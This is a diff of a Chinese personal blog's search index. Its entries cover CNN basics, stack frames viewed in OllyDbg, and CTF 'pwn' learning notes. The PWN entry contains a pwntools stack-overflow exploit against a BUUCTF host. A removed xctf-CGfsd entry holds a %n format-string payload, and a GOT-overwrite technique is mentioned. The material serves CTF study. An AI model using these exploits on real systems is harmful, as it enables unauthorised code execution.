@@ -1,6 +1,114 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CNN原理与实践</title>
+    <url>/2021/10/17/CNN%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
+    <content><![CDATA[<h2 id="原理详解">原理详解</h2>
+<h3 id="卷积">卷积</h3>
+<p>通过设置一个<strong>filter或者称为kernel</strong>，对输入的矩阵进行<strong>卷积</strong>，对应位置相乘。<strong>步长为1</strong>，矩阵两个维度均减小<strong>kernel维度-1</strong>.</p>
+<p><strong>可以通过设计特定的filter，让它去跟图片做卷积，就可以识别出图片中的某些特征</strong><span id="more"></span></p>
+<p><strong>CNN（convolutional neural network），主要就是通过一个个的filter，不断地提取特征，从局部的特征到总体的特征，从而进行图像识别等等功能。</strong>学习的目的就是去学习这些filter中的参数。</p>
+<meta name="referrer" content="no-referrer"/>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193054401-148638570.jpg" /></p>
+<h3 id="padding填白">Padding填白</h3>
+<p>经过卷积后，图像会越来越小，padding分为<strong>same</strong>和<strong>valid</strong>。</p>
+<p>same 就是卷积前后大小不变。<strong>在卷积前</strong>，对图像增加一个padding填白，使大小不变。先要确定卷积核的大小才能确定填充大小。</p>
+<p>valid 就是不经过任何填白。</p>
+<p>但是用什么填充呢，一般采用0填充。零填充：在图片像素的最外层加上若干层0值，若一层，记做p =1。<strong>0在权重乘积和运算中对最终结果不造成影响，也就避免了图片增加了额外的干扰信息。</strong></p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193714290-897558988.jpg" /></p>
+<h3 id="步长stride">步长stride</h3>
+<p>就是卷积核的移动长度，每次向右移动一个步长。</p>
+<h3 id="pooling池化">pooling池化</h3>
+<p>有的地方也成为<strong>采样sampling</strong></p>
+<p>池化的目的使提取一定区域的主要特征，<strong>减少参数数量，防止模型过拟合</strong>。</p>
+<p>常见的pooling有<strong>maxpooling</strong>，取一定区域的最大值。取步长为2，取区域最大值。还有averagePooling</p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194057122-600716143.jpg" /></p>
+<h3 id="多通道卷积">多通道卷积</h3>
+<p>全面看的都是输入的二维矩阵，现在看多通道，即三维的输入。</p>
+<p>注意到下图要求，卷积核的最后一个3就是<strong>通道channel</strong>数，必须相同。</p>
+<p>每一个kernel进行卷积得到一个二维矩阵，通过激活函数ReLU后放在一起即可。</p>
+<p>这里需要主要一下维度的变化，<strong>kernel的数量==结果的通道数，输入通道数==kernel通道数</strong>。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194352219-2047578984.jpg" /></p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008200101676-1316336134.png" /></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_height = (input_height - filter_height + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br><span class="line">new_width = (input_width - filter_width + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h3 id="cnn网络结构">CNN网络结构</h3>
+<p>X--&gt;CONV(relu)--&gt;MAXPOOL--&gt;CONV(relu)--&gt;FC(relu)--&gt;FC(softmax)--&gt;Y</p>
+<p>扁平化 <strong>(height,width,channel)</strong>的数据压缩成长度为 <strong>height × width × channel</strong> 的一维数组，然后再与 <strong>FC层</strong>连接，<strong>这之后就跟普通的神经网络无异了</strong>。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194727363-1650633100.jpg" /></p>
+<h3 id="cnn相对传统网络的优势">CNN相对传统网络的优势</h3>
+<ul>
+<li>参数共享机制。网络的参数大大减少，可以使用较少的参数训练出更好的模型。</li>
+<li>连接的稀疏性 输出的图像的任何一个单元仅和图像的一部分有关。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shape : N*C*H*W  ,  卷积核： H*W*</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211010095235308-136260343.png" /></p>
+<h2 id="cnn代码实践">CNN代码实践</h2>
+<h2 id="参考">参考</h2>
+<p><a href="https://zhuanlan.zhihu.com/p/42559190">【DL笔记6】从此明白了卷积神经网络（CNN） - 知乎 (zhihu.com)</a></p>
+<p><a href="https://blog.csdn.net/qq_34714751/article/details/85610966">(14条消息) 使用PyTorch实现CNN_dongyangY的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>deep_learning</category>
+      </categories>
+      <tags>
+        <tag>深度学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C语言函数调用栈的变化</title>
+    <url>/2021/11/12/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96.html</url>
+    <content><![CDATA[<p>函数调用过程中栈的变化情况，使用OD查看。</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<h2 id="写一个简单的c程序">写一个简单的C程序</h2>
+<p><img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175432813-259024174.png" /></p>
+<h2 id="od调试">OD调试</h2>
+<p>备注OD中显示的字符串顺序和字节顺序相反。<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175856659-1739815303.png" alt="image-20210928175853974" /></p>
+<p>设置两个断点，上面的是fun函数，下面的是main函数，直接F9执行到printf处。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175530047-778883573.png" alt="image-20210928175527193" /><figcaption aria-hidden="true">image-20210928175527193</figcaption>
+</figure>
+<p>执行到printf处时，栈的情况。EBP=0x0061FEA8，需要主要栈窗口中会将一个函数对应的栈空间用大括号括起来，上一个函数保存的EBP往往在<strong>大括号外面</strong>的下一个，EBP寄存器也指向那个单元。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180053498-1839617944.png" alt="image-20210928180050775" /><figcaption aria-hidden="true">image-20210928180050775</figcaption>
+</figure>
+<p>F8继续执行，发现栈顶的hello并没有消失，不知道为啥。难道是因为使用的是move esp hello？</p>
+<p>F7进入fun函数，push了调用fun函数指令的下一条执行。0x401500是fun函数的起始地址，push ebp指令的地址。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180651374-840441997.png" alt="image-20210928180648633" /><figcaption aria-hidden="true">image-20210928180648633</figcaption>
+</figure>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180832040-362440497.png" alt="image-20210928180829321" /><figcaption aria-hidden="true">image-20210928180829321</figcaption>
+</figure>
+<p>继续执行push ebp，观察栈的变化。0x0061FEA8是main函数的EBP，此时EBP任然等于0x0061FEA8.</p>
+<p>注意这里大括号的位置，EBP和之后的EIP都存在main的栈里面。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180931017-719194241.png" alt="image-20210928180928333" /><figcaption aria-hidden="true">image-20210928180928333</figcaption>
+</figure>
+<p>直接执行到leave，栈空间大小位16个单元。局部变量放在EBP上面，还有12个单元是空着的。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181348437-912568688.png" alt="image-20210928181345703" /><figcaption aria-hidden="true">image-20210928181345703</figcaption>
+</figure>
+<p>执行leave，观察C9 leave的作用.关闭了栈空间，但是原来的数据还是在那。相当于仅仅改变了EBP和ESP到执行fun函数的第一条指令前。</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181655819-1321192269.png" alt="image-20210928181653008" /><figcaption aria-hidden="true">image-20210928181653008</figcaption>
+</figure>
+<p>最后执行retn，EIP=0x40152E</p>
+<figure>
+<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181911952-576817960.png" alt="image-20210928181908302" /><figcaption aria-hidden="true">image-20210928181908302</figcaption>
+</figure>
+<h2 id="总结">总结</h2>
+<p>函数调用过程中，先入下一条指令地址，再保存EBP，再往上面放局部变量等。</p>
+<p>fun没有包含参数调用，参数应该是最早入栈的.然后才是EIP，最后是EBP。之后就是调用函数的参数</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>reversing</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ELF文件解析</title>
     <url>/2021/11/12/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90.html</url>
     <content><![CDATA[<p>ELF可执行可链接格式，最初由UNIX系统实验室作为应用程序二进制接口的一部分制定，是COFF(common file format)的变种，相关定义在/usr/include/elf.h文件中。</p>
@@ -160,57 +268,52 @@
       </tags>
   </entry>
   <entry>
-    <title>C语言函数调用栈的变化</title>
-    <url>/2021/11/12/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96.html</url>
-    <content><![CDATA[<p>函数调用过程中栈的变化情况，使用OD查看。</p>
+    <title>PWN入门</title>
+    <url>/2021/11/12/PWN%E5%85%A5%E9%97%A8.html</url>
+    <content><![CDATA[<p>pwn 入门学习，走一遍流程</p>
 <span id="more"></span>
 <meta name="referrer" content="no-referrer"/>
-<h2 id="写一个简单的c程序">写一个简单的C程序</h2>
-<p><img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175432813-259024174.png" /></p>
-<h2 id="od调试">OD调试</h2>
-<p>备注OD中显示的字符串顺序和字节顺序相反。<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175856659-1739815303.png" alt="image-20210928175853974" /></p>
-<p>设置两个断点，上面的是fun函数，下面的是main函数，直接F9执行到printf处。</p>
+<p>[TOC]</p>
+<p><a href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> rip</p>
+<h2 id="checksec">checksec</h2>
+<p>使用,查看文件的加固机制</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec filename#老版</span><br><span class="line">checksec --file=filename #新版</span><br></pre></td></tr></table></figure>
+<center>
+<image src="https://upload-images.jianshu.io/upload_images/11071922-51baa910d9fa15dc.png?imageMogr2/auto-orient/strip|imageView2/2/w/626/format/webp"/>
+</center>
+<p><strong>Arch:</strong>程序架构信息</p>
+<p><strong>RELRO</strong>（relocation read-only)：主要针对GOT改写的攻击方式，分为两种，partial relro和full relro</p>
+<p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh00获得shell</strong> 完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
+<p><strong>stack-caacry:</strong>栈溢出保护。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</p>
+<p><strong>NX：</strong>开启会让栈中数据没有执行权限，无法触发shellcode，只会造成程序崩溃，可以利用rop绕过。</p>
+<p><strong>PIE</strong>：位置无关可执行，程序运行时各个段加载的虚拟地址是再装载时确定。</p>
+<h2 id="静态分析代码">静态分析代码</h2>
+<p>看到main函数，gets函数可能存在栈溢出漏洞，接着点击s局部变量进入栈空间。</p>
 <figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928175530047-778883573.png" alt="image-20210928175527193" /><figcaption aria-hidden="true">image-20210928175527193</figcaption>
+<img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133030041-1533255546.png" alt="image-20210924133025356" /><figcaption aria-hidden="true">image-20210924133025356</figcaption>
 </figure>
-<p>执行到printf处时，栈的情况。EBP=0x0061FEA8，需要主要栈窗口中会将一个函数对应的栈空间用大括号括起来，上一个函数保存的EBP往往在<strong>大括号外面</strong>的下一个，EBP寄存器也指向那个单元。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180053498-1839617944.png" alt="image-20210928180050775" /><figcaption aria-hidden="true">image-20210928180050775</figcaption>
-</figure>
-<p>F8继续执行，发现栈顶的hello并没有消失，不知道为啥。难道是因为使用的是move esp hello？</p>
-<p>F7进入fun函数，push了调用fun函数指令的下一条执行。0x401500是fun函数的起始地址，push ebp指令的地址。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180651374-840441997.png" alt="image-20210928180648633" /><figcaption aria-hidden="true">image-20210928180648633</figcaption>
-</figure>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180832040-362440497.png" alt="image-20210928180829321" /><figcaption aria-hidden="true">image-20210928180829321</figcaption>
-</figure>
-<p>继续执行push ebp，观察栈的变化。0x0061FEA8是main函数的EBP，此时EBP任然等于0x0061FEA8.</p>
-<p>注意这里大括号的位置，EBP和之后的EIP都存在main的栈里面。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928180931017-719194241.png" alt="image-20210928180928333" /><figcaption aria-hidden="true">image-20210928180928333</figcaption>
-</figure>
-<p>直接执行到leave，栈空间大小位16个单元。局部变量放在EBP上面，还有12个单元是空着的。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181348437-912568688.png" alt="image-20210928181345703" /><figcaption aria-hidden="true">image-20210928181345703</figcaption>
-</figure>
-<p>执行leave，观察C9 leave的作用.关闭了栈空间，但是原来的数据还是在那。相当于仅仅改变了EBP和ESP到执行fun函数的第一条指令前。</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181655819-1321192269.png" alt="image-20210928181653008" /><figcaption aria-hidden="true">image-20210928181653008</figcaption>
-</figure>
-<p>最后执行retn，EIP=0x40152E</p>
-<figure>
-<img src="/images/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96/2348945-20210928181911952-576817960.png" alt="image-20210928181908302" /><figcaption aria-hidden="true">image-20210928181908302</figcaption>
-</figure>
-<h2 id="总结">总结</h2>
-<p>函数调用过程中，先入下一条指令地址，再保存EBP，再往上面放局部变量等。</p>
-<p>fun没有包含参数调用，参数应该是最早入栈的.然后才是EIP，最后是EBP。之后就是调用函数的参数</p>
+<p>第一次看到略感奇怪怎么两个s，r又是什么。首先明确这是main函数的栈空间，<strong>上面的s是局部变量，下面的s指的是rbp</strong>，64位程序8个字节。r比较特殊，有的地方说是return的东西，但是返回东西一般是通过寄存器eax或rax返回的，有点忘了。<strong>r应该是main函数执行完成后，EIP的值，即main函数结束后要执行的下一条执行。</strong></p>
+<p>栈溢出漏洞请自行补充知识。</p>
+<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133138596-1167051620.png" /></p>
+<p>找到提权函数，这个还没有搞懂，大概就是让mian函数执行完了，执行fun函数，然后既可以cat flag了。</p>
+<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133524694-1219666581.png" /></p>
+<h2 id="动态分析">动态分析</h2>
+<p>难度大一些的才需要，使用GDB和peda分析。</p>
+<h2 id="编写exp">编写exp</h2>
+<p>remote和process一个是远程服务器，一个是本地尝试，使用时只用一个。</p>
+<p>本地测试需要赋予可执行的权限，不然总是显示没有权限sudo也不行。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod a+x pwn1</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28082</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn1&#x27;) </span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span> + <span class="number">0x8</span>) + p64(<span class="number">0x0401185</span>) + p64(<span class="number">0x0401186</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p1) <span class="comment">#哈啊哈</span></span><br><span class="line"></span><br><span class="line">r.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考">参考</h2>
+<p><a href="https://www.jianshu.com/p/755e52d48a77">checksec工具使用-pwn - 简书 (jianshu.com)</a></p>
+<p>[(12条消息) <a href="https://blog.csdn.net/weixin_45004513/article/details/117332121">CTF PWN] 从0到0.00001 PWN入门超级详细_Csome-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>reversing</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -260,60 +363,6 @@
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CNN原理与实践</title>
-    <url>/2021/10/17/CNN%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5.html</url>
-    <content><![CDATA[<h2 id="原理详解">原理详解</h2>
-<h3 id="卷积">卷积</h3>
-<p>通过设置一个<strong>filter或者称为kernel</strong>，对输入的矩阵进行<strong>卷积</strong>，对应位置相乘。<strong>步长为1</strong>，矩阵两个维度均减小<strong>kernel维度-1</strong>.</p>
-<p><strong>可以通过设计特定的filter，让它去跟图片做卷积，就可以识别出图片中的某些特征</strong><span id="more"></span></p>
-<p><strong>CNN（convolutional neural network），主要就是通过一个个的filter，不断地提取特征，从局部的特征到总体的特征，从而进行图像识别等等功能。</strong>学习的目的就是去学习这些filter中的参数。</p>
-<meta name="referrer" content="no-referrer"/>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193054401-148638570.jpg" /></p>
-<h3 id="padding填白">Padding填白</h3>
-<p>经过卷积后，图像会越来越小，padding分为<strong>same</strong>和<strong>valid</strong>。</p>
-<p>same 就是卷积前后大小不变。<strong>在卷积前</strong>，对图像增加一个padding填白，使大小不变。先要确定卷积核的大小才能确定填充大小。</p>
-<p>valid 就是不经过任何填白。</p>
-<p>但是用什么填充呢，一般采用0填充。零填充：在图片像素的最外层加上若干层0值，若一层，记做p =1。<strong>0在权重乘积和运算中对最终结果不造成影响，也就避免了图片增加了额外的干扰信息。</strong></p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008193714290-897558988.jpg" /></p>
-<h3 id="步长stride">步长stride</h3>
-<p>就是卷积核的移动长度，每次向右移动一个步长。</p>
-<h3 id="pooling池化">pooling池化</h3>
-<p>有的地方也成为<strong>采样sampling</strong></p>
-<p>池化的目的使提取一定区域的主要特征，<strong>减少参数数量，防止模型过拟合</strong>。</p>
-<p>常见的pooling有<strong>maxpooling</strong>，取一定区域的最大值。取步长为2，取区域最大值。还有averagePooling</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194057122-600716143.jpg" /></p>
-<h3 id="多通道卷积">多通道卷积</h3>
-<p>全面看的都是输入的二维矩阵，现在看多通道，即三维的输入。</p>
-<p>注意到下图要求，卷积核的最后一个3就是<strong>通道channel</strong>数，必须相同。</p>
-<p>每一个kernel进行卷积得到一个二维矩阵，通过激活函数ReLU后放在一起即可。</p>
-<p>这里需要主要一下维度的变化，<strong>kernel的数量==结果的通道数，输入通道数==kernel通道数</strong>。</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194352219-2047578984.jpg" /></p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008200101676-1316336134.png" /></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_height = (input_height - filter_height + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br><span class="line">new_width = (input_width - filter_width + <span class="number">2</span> * P)/S + <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<h3 id="cnn网络结构">CNN网络结构</h3>
-<p>X--&gt;CONV(relu)--&gt;MAXPOOL--&gt;CONV(relu)--&gt;FC(relu)--&gt;FC(softmax)--&gt;Y</p>
-<p>扁平化 <strong>(height,width,channel)</strong>的数据压缩成长度为 <strong>height × width × channel</strong> 的一维数组，然后再与 <strong>FC层</strong>连接，<strong>这之后就跟普通的神经网络无异了</strong>。</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211008194727363-1650633100.jpg" /></p>
-<h3 id="cnn相对传统网络的优势">CNN相对传统网络的优势</h3>
-<ul>
-<li>参数共享机制。网络的参数大大减少，可以使用较少的参数训练出更好的模型。</li>
-<li>连接的稀疏性 输出的图像的任何一个单元仅和图像的一部分有关。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shape : N*C*H*W  ,  卷积核： H*W*</span><br></pre></td></tr></table></figure>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211010095235308-136260343.png" /></p>
-<h2 id="cnn代码实践">CNN代码实践</h2>
-<h2 id="参考">参考</h2>
-<p><a href="https://zhuanlan.zhihu.com/p/42559190">【DL笔记6】从此明白了卷积神经网络（CNN） - 知乎 (zhihu.com)</a></p>
-<p><a href="https://blog.csdn.net/qq_34714751/article/details/85610966">(14条消息) 使用PyTorch实现CNN_dongyangY的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>deep_learning</category>
-      </categories>
-      <tags>
-        <tag>model</tag>
       </tags>
   </entry>
   <entry>
@@ -557,51 +606,6 @@ k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delt
       </tags>
   </entry>
   <entry>
-    <title>xctf-CGfsd</title>
-    <url>/2021/11/12/xctf-CGfsd.html</url>
-    <content><![CDATA[<p>PWN中的格式化字符漏洞，从实践出发。</p>
-<span id="more"></span>
-<h2 id="printf格式化字符串">printf格式化字符串</h2>
-<h3 id="基础知识">基础知识</h3>
-<p>printf常见用法,前面是format，后面是匹配的参数。printf本身可以输入无限参数，即printf不知道参数个数，有格式化字符串%s,%d,%c等就到栈中去取参数。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br></pre></td></tr></table></figure>
-<p>有一个特殊的格式化字符串%n,将前面的字符数量输入到参数中，赋值。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;aaaa%n&quot;,&amp;d);// d=4</span><br></pre></td></tr></table></figure>
-<p>介绍一个格式化字符串的用法<strong>%5$d</strong>,表示参数从左到右第5个参数，好多博客这里没有讲，但是不同类型会不会有影响就不知道了，比如参数的类型不同，size不同，printf是不知道栈的那个位置具体是什么类型的。</p>
-<p>直接输出s，没有格式化字符串。一般情况下是正常的输出s。但是一旦s中存在格式化字符串就可能存在漏洞。这个时候<strong>s就相当于format</strong>，但是没有传入任何参数。printf就会<strong>从栈顶开始依次匹配</strong>相应的类型大小数据输出。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(s);</span><br></pre></td></tr></table></figure>
-<h3 id="实例">实例</h3>
-<p>写一个小的C文件看看。</p>
-<p><img src="/images/xctf-CGfsd/2348945-20210924214658533-1665723789.png" /></p>
-<p>输入AAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x,可以发现从栈顶开始依次输出。可以看到地址61FE3C的位置存储着s字符串。匹配的第7个单元是s的实际存储位置。</p>
-<p><strong>主要是中间调用了printf函数导致很难具体分析栈空间，所以需要使用这种方法找到偏移位置。</strong></p>
-<figure>
-<img src="/images/xctf-CGfsd/2348945-20210924214649609-1405132903.png" alt="image-20210924214644435" /><figcaption aria-hidden="true">image-20210924214644435</figcaption>
-</figure>
-<figure>
-<img src="/images/xctf-CGfsd/2348945-20210924220054329-1040800902.png" alt="image-20210924220048916" /><figcaption aria-hidden="true">image-20210924220048916</figcaption>
-</figure>
-<h2 id="xtf_cgfsd">XTF_CGFSD</h2>
-<figure>
-<img src="/images/xctf-CGfsd/2348945-20210924220519202-68676763.png" alt="image-20210924220513883" /><figcaption aria-hidden="true">image-20210924220513883</figcaption>
-</figure>
-<p><strong>目标：</strong>将pwnme的地址放到字符串s中，并且使用%(offset)$n将输出的字符串长度8放到那个地址中。将那个地址作为printf传入的第offset个参数。</p>
-<figure>
-<img src="/images/xctf-CGfsd/2348945-20210924214603821-1020535736.png" alt="image-20210924214557978" /><figcaption aria-hidden="true">image-20210924214557978</figcaption>
-</figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">55024</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please tell me your name:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;sdsds&quot;</span>)</span><br><span class="line">p=<span class="number">0x804A068</span></span><br><span class="line">payload=p32(p)+<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;%10$n&quot;</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;leave your message please:&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="/images/xctf-CGfsd/2348945-20210924214806885-2131536334.png" alt="image-20210924214801629" /><figcaption aria-hidden="true">image-20210924214801629</figcaption>
-</figure>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Word2vec</title>
     <url>/2021/10/17/word2vec.html</url>
     <content><![CDATA[<p>Word2Vec是语言模型中的一种，它是从大量文本预料中以无监督方式学习语义知识的模型，被广泛地应用于自然语言处理中。</p>
@@ -649,6 +653,90 @@ k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delt
       </tags>
   </entry>
   <entry>
+    <title>xctf-CGfsd</title>
+    <url>/2021/11/12/xctf-CGfsd.html</url>
+    <content><![CDATA[<p>PWN中的格式化字符漏洞，从实践出发。</p>
+<span id="more"></span>
+<h2 id="printf格式化字符串">printf格式化字符串</h2>
+<h3 id="基础知识">基础知识</h3>
+<p>printf常见用法,前面是format，后面是匹配的参数。printf本身可以输入无限参数，即printf不知道参数个数，有格式化字符串%s,%d,%c等就到栈中去取参数。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br></pre></td></tr></table></figure>
+<p>有一个特殊的格式化字符串%n,将前面的字符数量输入到参数中，赋值。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;aaaa%n&quot;,&amp;d);// d=4</span><br></pre></td></tr></table></figure>
